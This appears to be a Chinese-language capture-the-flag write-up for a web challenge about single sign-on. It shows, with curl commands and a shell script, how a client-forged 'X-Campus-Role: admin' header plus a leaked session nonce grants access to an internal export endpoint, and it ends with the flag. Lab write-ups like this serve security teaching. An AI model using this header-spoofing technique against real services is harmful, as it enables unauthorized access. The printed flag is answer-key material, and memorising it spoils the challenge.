# 单点登录的信任裂缝题解

## 一、题目考点

本题主要考查 Web 场景中的身份代理头信任问题。

核心考点如下：

1. **Cookie Session 复用**

   登录后服务端会下发 `support_sid`，后续访问个人支持页和内部导出接口时都需要保持同一个 Cookie Session。

2. **页面信息收集**

   普通用户登录后，个人支持页会泄露关键调试信息，包括：

   - 后端接收身份头：`X-Campus-Role`
   - 内部导出接口：`/internal/export`
   - 当前会话导出 nonce

3. **客户端可控请求头导致的权限绕过**

   后端错误信任了客户端传入的代理身份头 `X-Campus-Role`。攻击者可以在请求中手动添加：

   ```http
   X-Campus-Role: admin
   ```

   从而把普通用户会话伪装成管理员代理身份。

4. **nonce 校验绕过条件**

   内部导出接口需要携带当前会话对应的 nonce，请求头为：

   ```http
   X-Export-Nonce: <当前会话 nonce>
   ```

   只要保持同一个 `support_sid`，并使用 `/profile` 页面显示的 nonce，即可通过校验。

## 二、解题思路

首先访问题目环境首页：

```bash
curl -i http://web-f0187bda68.adworld.xctf.org.cn/
```

页面中给出普通支持账号：

```text
student2025 / practice-only
```

然后使用该账号登录，并保存服务端返回的 Cookie：

```bash
curl -i -c /tmp/ctf_sso_cookies.txt \
  -d 'username=student2025&password=practice-only' \
  http://web-f0187bda68.adworld.xctf.org.cn/login
```

登录成功后，服务端返回 `support_sid`，后续请求都需要使用该 Cookie。

接着访问个人支持页：

```bash
curl -i -b /tmp/ctf_sso_cookies.txt \
  http://web-f0187bda68.adworld.xctf.org.cn/profile
```

页面中可以看到类似信息：

```html
代理链调试提示：后端接收身份头 <code>X-Campus-Role</code>。
内部导出接口：<code>/internal/export</code>
管理链路备注：该导出接口仅接受 <code>admin</code> 代理身份。
本会话导出 nonce：<code>17QVHJE9A5ocg0WdyHQCojGd</code>
```

由此可知，内部导出接口需要满足三个条件：

- 使用已登录的 `support_sid`
- 请求头中携带当前会话 nonce
- 请求头中身份为 `admin`

由于 `X-Campus-Role` 是客户端可控的请求头，因此可以直接伪造为 `admin`：

```bash
curl -i -b /tmp/ctf_sso_cookies.txt \
  -H 'X-Campus-Role: admin' \
  -H 'X-Export-Nonce: 17QVHJE9A5ocg0WdyHQCojGd' \
  http://web-f0187bda68.adworld.xctf.org.cn/internal/export
```

需要注意的是，nonce 与当前会话相关，每次重新登录后可能变化，应以当前 `/profile` 页面显示的值为准。

也可以用下面的流程自动完成登录、提取 nonce 和导出：

```bash
tmp_cookie=/tmp/ctf_sso_cookies_rerun.txt

curl -i -sS -c "$tmp_cookie" \
  -d 'username=student2025&password=practice-only' \
  http://web-f0187bda68.adworld.xctf.org.cn/login

profile=$(curl -sS -b "$tmp_cookie" \
  http://web-f0187bda68.adworld.xctf.org.cn/profile)

nonce=$(printf '%s' "$profile" \
  | sed -n 's/.*本会话导出 nonce：<code>\([^<]*\)<\/code>.*/\1/p')

curl -i -sS -b "$tmp_cookie" \
  -H 'X-Campus-Role: admin' \
  -H "X-Export-Nonce: $nonce" \
  http://web-f0187bda68.adworld.xctf.org.cn/internal/export
```

接口返回内容中包含 `flag` 字段，说明导出成功。

flag{qVWsUZD7vaN07FKuYaEA6RIUqjDGIto5}
